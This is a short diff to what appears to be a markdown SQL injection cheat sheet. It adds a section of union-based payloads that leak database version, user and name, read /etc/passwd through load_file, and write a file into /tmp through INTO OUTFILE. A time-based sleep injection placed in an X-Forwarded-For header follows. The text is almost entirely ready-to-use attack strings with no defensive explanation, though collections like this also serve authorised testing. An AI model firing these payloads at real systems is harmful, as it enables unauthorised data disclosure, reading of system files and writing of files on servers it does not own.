@@ -6,11 +6,17 @@ ___
 https://portswigger.net/web-security/sql-injection/cheat-sheet
 ___
 
-### Examples
-```sql
+## SQL injection with load file and into outfile
+```
 ' and 1=2 union all select concat_ws(0x3a,version(),user(),database())--
 
 ' and 1=2 union all select load_file('/etc/passwd')--
+
+' and 1=2 union all select 'blablabla_bug_bounty_program' into outfile '/tmp/blablabla--
+
+```
+### Examples
+```sql
 
 X-Forwarded-For: "' or sleep(30)='" >> For any type of HTTP headers ✔
 
